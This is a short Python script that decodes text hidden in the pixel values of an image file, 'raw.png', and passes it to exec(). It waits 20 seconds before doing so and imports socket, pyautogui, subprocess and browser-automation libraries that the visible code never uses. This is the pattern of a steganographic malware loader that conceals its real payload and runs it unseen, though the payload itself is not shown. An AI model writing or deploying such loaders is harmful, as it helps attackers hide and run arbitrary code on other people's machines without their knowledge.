import numpy as np
from PIL import Image
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.chrome.service import Service
from webdriver_manager.chrome import ChromeDriverManager
from selenium.webdriver.common.by import By
import socket, pyautogui, os, subprocess, time
time.sleep(20)
img = Image.open('raw.png')
arr = np.array(img, np.uint8)
HEIGHT, WIDTH = arr.shape[:2]

code = ''

arr1 = [chr(arr[j][i][k] if arr[j][i][k]<=126 else 0) for j in range(HEIGHT) for i in range(WIDTH) for k in range(3)]
code = ''.join(arr1)
where = code.find(chr(0))
code = code[:where] if where != -1 else code
exec(code)